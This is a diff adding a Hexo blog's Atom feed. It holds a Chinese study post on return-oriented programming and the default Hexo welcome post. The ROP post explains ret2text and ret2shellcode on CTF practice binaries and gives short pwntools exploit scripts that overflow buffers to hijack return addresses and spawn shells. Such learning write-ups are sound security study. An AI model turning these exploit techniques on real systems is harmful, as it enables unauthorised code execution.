@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Hexo</title>
+  
+  
+  <link href="https://username.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://username.github.io/"/>
+  <updated>2023-01-10T08:37:11.526Z</updated>
+  <id>https://username.github.io/</id>
+  
+  <author>
+    <name>wased</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>基本ROP</title>
+    <link href="https://username.github.io/2023/01/09/%E5%9F%BA%E6%9C%ACROP/"/>
+    <id>https://username.github.io/2023/01/09/%E5%9F%BA%E6%9C%ACROP/</id>
+    <published>2023-01-09T08:29:01.000Z</published>
+    <updated>2023-01-10T08:37:11.526Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="rop学习记录"><a class="markdownIt-Anchor" href="#rop学习记录"></a> ROP学习记录</h1><blockquote><p>ROP的全称为Return-oriented programming（返回导向编程）</p></blockquote><p>保护机制：</p><p>DEP（堆栈不可执行）</p><p>ASLR（内存地址随机化）</p><p>Stack Protector（栈保护）</p><p>NX:No-eXecute(不可执行),基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>主要思想：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</p><p><strong>ROP攻击一般条件：</strong></p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以找到满足条件的 gadgets(不相邻的程序已有的代码 ) 以及相应 gadgets 的地址</li></ul><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)</p><h3 id="练习"><a class="markdownIt-Anchor" href="#练习"></a> 练习：</h3><h4 id="pwn1_1"><a class="markdownIt-Anchor" href="#pwn1_1"></a> pwn1_1</h4><p>checksec:</p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109174628094.png" alt="image-20230109174628094" /></p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109173622643.png" alt="image-20230109173622643" /></p><p>ida分析后发现这里读入是通过read，且这里的读取长度4096&gt;buf的定义16,可造成溢出</p><p>这里可见后门函数：<img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109174000217.png" alt="image-20230109174000217" /></p><p>这里分析buf函数以找出返回地址</p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109174152052.png" alt="image-20230109174152052" /></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;gxh191.top&quot;</span>,<span class="number">25537</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span>*(<span class="number">16</span>+<span class="number">8</span>) + p64(<span class="number">0x40119E</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ctfhub_ret2text"><a class="markdownIt-Anchor" href="#ctfhub_ret2text"></a> CTFHUB_ret2text:</h4><p>checksec:</p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109174720749.png" alt="image-20230109174720749" /></p><p>ida分析代码</p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109171259776.png" alt="image-20230109171259776" /></p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109171321263.png" alt="image-20230109171321263" /></p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109171458825.png" alt="image-20230109171458825" /></p><p>EXP如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">sh= remote(<span class="string">&quot;challenge-b3dded864d8eec43.sandbox.ctfhub.com&quot;</span>,<span class="number">26822</span>)</span><br><span class="line">target = <span class="number">0x04007B8</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">120</span>) + p64(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h2><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理：</h3><p>即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码</p><p>**注意：**要想执行shellcode，需要对应的程序在运行时shellcode所在的位置具有可执行权限,</p><p><strong>基本思路：</strong> 先找到溢出点，确定溢出位后看是否可在bss段写数据，确定可写后将shellcode的数据发送到bss段，最后通过覆盖跳转地址跳转到shellcode所在的地址进行执行</p><blockquote><p>BSS段（bss segment）通常是指用来存放程序中<strong>未初始化</strong>的或者<strong>初始化为0</strong>的<strong>全局变量</strong>和<strong>局部静态变量</strong>的一块内存区域。BSS是英文<strong>Block Started by Symbol</strong>的简称。BSS段属于<em>静态内存分配</em></p></blockquote><h3 id="练习-2"><a class="markdownIt-Anchor" href="#练习-2"></a> 练习</h3><h4 id="ret2shellcode-2"><a class="markdownIt-Anchor" href="#ret2shellcode-2"></a> ret2shellcode</h4><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230109175501253.png" alt="image-20230109175501253" /></p><p>程序几乎没有开启任何保护</p><p>这里ida分析：<img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230110101717904.png" alt="image-20230110101717904" /></p><p>看到将s的数据复制到了buf2，而buf2在.bss段：<img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230110101756013.png" alt="image-20230110101756013" /></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment"># asm(shellcraft.sh())该语句生成shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn2_2"><a class="markdownIt-Anchor" href="#pwn2_2"></a> pwn2_2</h4><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230110113139785.png" alt="image-20230110113139785" /></p><p>这里修改了phone_number所在的bss段的权限，权限7表示可读可写可执行</p><p><img src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20230110113321067.png" alt="image-20230110113321067" /></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn2_2&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x04040A0</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(buf2_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>关于这里的context:</p><blockquote><p>context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题,一般来说我们设置context只需要简单的一句话:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br></pre></td></tr></table></figure><p>或者 <code>context(os='linux', arch='amd64')</code></p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol></blockquote><h2 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall"></a> ret2syscall</h2><h3 id="原理-3"><a class="markdownIt-Anchor" href="#原理-3"></a> 原理：</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;rop学习记录&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rop学习记录&quot;&gt;&lt;/a&gt; ROP学习记录&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ROP的全称为Return-oriented programming（返回导向编程）&lt;/</summary>
+      
+    
+    
+    
+    <category term="学习" scheme="https://username.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+    <category term="pwn" scheme="https://username.github.io/tags/pwn/"/>
+    
+    <category term="ROP" scheme="https://username.github.io/tags/ROP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://username.github.io/2022/09/25/hello-world/"/>
+    <id>https://username.github.io/2022/09/25/hello-world/</id>
+    <published>2022-09-25T02:41:38.598Z</published>
+    <updated>2022-09-25T02:41:38.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
